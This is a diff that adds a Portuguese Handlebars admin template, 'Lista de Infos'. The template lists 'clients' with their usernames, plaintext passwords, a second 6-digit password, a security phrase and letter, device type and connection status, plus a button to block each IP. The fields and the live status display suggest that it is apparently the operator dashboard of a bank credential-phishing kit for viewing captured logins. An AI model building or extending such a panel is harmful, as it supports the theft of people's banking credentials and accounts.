@@ -1,0 +1,54 @@
+<div class="card">
+    <div class="card-header border-0">
+        <div class="row align-items-center">
+            <div class="col">
+                <h3 class="mb-0">Lista de Infos</h3>
+            </div>
+        </div>
+    </div>
+    <div class="table-responsive">
+        <!-- Projects table -->
+        <table class="table align-items-center table-flush">
+            <thead class="thead-light">
+                <tr>
+                    <th scope="col">#ID</th>
+                    <th scope="col">USUÁRIO</th>
+                    <th scope="col">SENHA</th>
+                    <th scope="col">FRASE</th>
+                    <th scope="col">LETRA</th>
+                    <th scope="col">Dispositivo</th>
+                </tr>
+            </thead>
+            <tbody class="productList">
+                {{#each clients}}
+                <tr data-id="{{id}}">
+                    <th scope="row" role="id">
+                        <strong># {{id}}</strong>
+                    </th>
+                    <td role="user">
+                        {{user}}
+                    </td>
+                    <td role="password">{{password}}</td>
+                    <input type="hidden" name="password6" value="{{password6}}">
+                    <input type="hidden" name="auth" value="{{auth}}">
+                    <td role="status" 
+                        class="blockstatus
+                            {{#ifCond status 'disconnected'}}disconnected{{else}}enter{{/ifCond}}
+                        "
+                    >
+                        <span>{{password6}}</span>
+                    </td>
+
+                    <td role="auth" class="blockstatus enter"><span>{{auth}}</span></td>
+                    <td role="device">
+                        <span class="snippet-device" data-bs-toggle="tooltip" data-bs-placement="top" title="
+                        Modelo: {{#if device.model}}{{device.model}}{{else}}Desconhecido{{/if}}
+                        ">{{#if device.type}}{{device.type}}{{else}}Desconhecido{{/if}}</span>
+                        <button data-client="{{id}}">Bloquear ip</button>
+                    </td>
+                </tr>
+                {{/each}}
+            </tbody>
+        </table>
+    </div>
+</div>
